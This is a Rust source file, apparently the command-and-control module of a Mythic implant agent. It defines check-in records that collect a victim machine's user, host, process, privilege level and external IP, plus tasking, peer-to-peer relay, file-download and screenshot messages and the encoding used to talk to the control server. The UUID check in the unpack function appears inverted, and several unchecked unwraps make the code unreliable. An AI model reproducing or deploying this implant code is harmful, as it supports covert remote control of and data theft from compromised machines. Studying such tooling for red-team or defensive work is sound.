use crate::{NError, NResult};
use data_encoding::BASE64;
use serde::{Deserialize, Serialize};
use toml::Value;

use crate::models::{ReqCheckin, RespCheckin};

pub mod http;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum C2Profile {
    #[serde(rename = "http")]
    Http(http::HttpProfile),
}

pub trait C2 {
    fn checkin(&self, payload_uuid: &uuid::Uuid, req: &ReqCheckin) -> NResult<RespCheckin>;
}

impl C2 for C2Profile {
    fn checkin(&self, payload_uuid: &uuid::Uuid, req: &ReqCheckin) -> NResult<RespCheckin> {
        match self {
            C2Profile::Http(http) => http.checkin(payload_uuid, req),
        }
    }
}

pub struct CheckinReq {
    pub action: String,
    pub uuid: uuid::Uuid,
    pub ips: Vec<String>,
    pub os: Option<String>,
    pub user: Option<String>,
    pub host: Option<String>,
    pub pid: Option<u32>,
    pub architecture: Option<String>,
    pub domain: Option<String>,
    pub integrity_level: Option<i32>,
    pub external_ip: Option<String>,
    pub encryption_key: Option<String>,
    pub decryption_key: Option<String>,
    pub process_name: Option<String>,
}

struct CheckinResp {
    action: String,
    id: uuid::Uuid,
    status: String,
}

struct GetTasksReq {
    action: String,
    tasking_size: i32,
}

// {
//     "action":"get_tasking",
//     "tasking_size": -1,
//     "delegates": [
// 	{"message": agentMessage, "c2_profile": "tcp", "uuid": "uuid here"},
// 	{"message": agentMessage, "c2_profile": "smb", "uuid": "uuid here"}
// 	]
// }
struct P2PDelegate {
    message: String,
    c2_profile: C2Profile,
    uuid: uuid::Uuid,
}
struct P2PGetTaskingRequest {
    action: String,
    tasking_size: i32,
    delegates: Vec<P2PDelegate>,
}

struct POSTResponse {
    action: String,
    responses: Vec<POSTResponseItem>,
    delegates: Vec<P2PDelegate>,
}

struct POSTResponseItem {
    task_id: uuid::Uuid,
    completed: bool,
    user_output: String,
    download: Option<Download>,
}

struct Download {
    total_chunks: i32,
    chunk_size: i32,
    filename: String,
    full_path: String,
    host: String,
    is_screenshot: bool,
}

pub fn pack_mythic_message<T: Serialize>(
    payload_uuid: &uuid::Uuid,
    json_data: &T,
) -> Result<String, serde_json::Error> {
    // 1. 将你的结构体（例如 ReqCheckin）序列化为标准的 JSON 字节流
    let json_bytes = serde_json::to_vec(json_data)?;

    // 2. 将 Uuid 转换为 Mythic 标准的 36 字节中划线字符串 (如: b50a5fe8-...)
    let uuid_string = payload_uuid.to_string();
    let uuid_bytes = uuid_string.as_bytes();

    // 3. 🚀【高性能免抖动】预先精准分配好整块连续的内存空间，防止 extend 时的多次内存拷贝
    let mut combined_buffer = Vec::with_capacity(uuid_bytes.len() + json_bytes.len());

    // 4. 依次把两块骨头拼进同一个肉身
    combined_buffer.extend_from_slice(uuid_bytes);
    combined_buffer.extend_from_slice(&json_bytes);

    let encoded_b64 = BASE64.encode(&combined_buffer);

    Ok(encoded_b64)
}

pub fn unpack_mythic_message(
    packed_b64: &str,
    payload_uuid: &uuid::Uuid,
) -> NResult<serde_json::Value> {
    // 1. 除去可能存在的两端空白字符，然后进行 Base64 解码
    let trimmed_b64 = packed_b64.trim();
    let msg = BASE64.decode(trimmed_b64.as_bytes()).unwrap();

    // 2. 🛡️ 安全校验：Mythic 的 UUID 字符串固定占 36 字节，总长度必须大于 36
    if msg.len() < 36 {
        println!("[-] 流量包长度不足 36 字节，无法提取 UUID");
        return Err(NError::CheckError);
    }

    // 3. 🚀 核心刀法：在第 36 字节处把整块内存“一分为二”
    // uuid_bytes 拿到前 36 字节，json_bytes 拿到后面剩下的所有字节
    let (uuid_bytes, json_bytes) = msg.split_at(36);

    // 4. 将前 36 字节的文本切片解析为标准的 Uuid 对象
    let uuid_str = std::str::from_utf8(uuid_bytes).unwrap();
    let server_uuid = uuid::Uuid::parse_str(uuid_str).unwrap();

    if server_uuid.eq(payload_uuid) {
        return Err(NError::CheckError);
    }

    // 5. 将剩下的字节流直接反序列化为你指定的强类型结构体
    let json_struct: serde_json::Value = serde_json::from_slice(json_bytes).unwrap();

    // 6. 完美返回一个元组：(谁发给我的, 发给我的内容是什么)
    Ok(json_struct)
}
